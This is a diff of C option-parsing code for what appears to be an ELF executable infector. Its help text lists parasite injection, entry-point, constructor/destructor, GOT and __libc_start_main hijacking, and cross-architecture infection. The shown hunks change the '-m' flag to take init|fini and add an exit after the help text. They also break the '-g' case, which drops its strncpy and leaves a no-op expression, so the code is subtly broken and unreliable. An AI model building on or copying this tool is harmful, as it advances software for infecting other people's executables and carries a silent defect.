@@ -16,11 +16,12 @@ static void print_help(char opt, char *prog)
     "-e             use entry point redirection\n"
     "-c             use ctor redirection\n"
     "-d             use dtor redirection\n"
-    "-m             hijack main's init arg\n"
+    "-m init|fini   hijack chosen __libc_start_main arg\n"
     "-v <addr>      patch parasite with addr for jmp point\n"
     "-q <position>  byte index into parasite with which to patch with return addr\n"
     "-x             cross architecture infection, infect executables on i386 if on x64 or infect executables of x64 if on i368\n",
     prog);
+    exit(-1);
 }
 
 opts_t * usage(int argc, char *argv[])
@@ -37,7 +38,7 @@ opts_t * usage(int argc, char *argv[])
     }
 
     memset(opts, 0, sizeof(opts_t));
-    while((c = getopt(argc, argv, "p:r:s:a:eg:cdmv:q:xh")) != -1)
+    while((c = getopt(argc, argv, "p:r:s:a:eg:cdm:v:q:xh")) != -1)
     {
         switch(c)
         {
@@ -50,11 +51,12 @@ opts_t * usage(int argc, char *argv[])
             case 'a': strncpy(opts->parasite, optarg, MAX_FILENAME-1);
                 opts->etrelinject++; break;
             case 'e': opts->entrypoint++; break;
-            case 'g': strncpy(opts->pltsymbol, optarg, MAX_FILENAME-1);
+            case 'g': (opts->pltsymbol, optarg, MAX_FILENAME-1);
                 opts->gottable++; break;
             case 'c': opts->ctors++; break;
             case 'd': opts->dtors++; break;
-            case 'm': opts->startmain++; break;
+            case 'm': opts->startmain_mode = str_to_mode(optarg); 
+            opts->startmain++; break;
             case 'v': opts->patch_addr = strtoul(optarg, NULL, 16); break;
             case 'q': opts->patch_pos = atoi(optarg); break;
             case 'x': opts->cross_infect++; break;
